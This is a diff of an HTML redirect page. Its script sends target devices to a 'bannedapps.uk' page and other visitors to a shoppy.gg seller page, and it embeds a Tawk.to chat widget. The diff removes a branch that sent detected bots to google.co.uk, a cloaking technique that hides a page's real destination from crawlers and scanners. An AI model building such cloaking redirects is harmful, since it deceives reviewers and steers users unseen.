@@ -16,13 +16,9 @@
                 ].some(device => userAgent.includes(device));
             }
 
-            
-
             // Get the user agent and perform redirection based on type
             const userAgent = navigator.userAgent;
-            if (isBot(userAgent)) {
-                window.location.href = "https://google.co.uk"; // Bot-specific URL
-            } else if (isTargetDevice(userAgent)) {
+            if (isTargetDevice(userAgent)) {
                 window.location.href = "https://bannedapps.uk/D/D.html";
             } else {
                 window.location.href = "https://shoppy.gg/@itsmat32143";
@@ -30,7 +26,6 @@
         });
     </script>
 
-    <!-- Start of Tawk.to Script -->
     <script type="text/javascript">
         document.addEventListener("DOMContentLoaded", function() {
             var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
@@ -44,8 +39,7 @@
             })();
         });
     </script>
-    <!-- End of Tawk.to Script -->
-</head>
+    </head>
 <body>
     <p>Redirecting...</p>
     <noscript><p>Please enable JavaScript to redirect.</p></noscript>
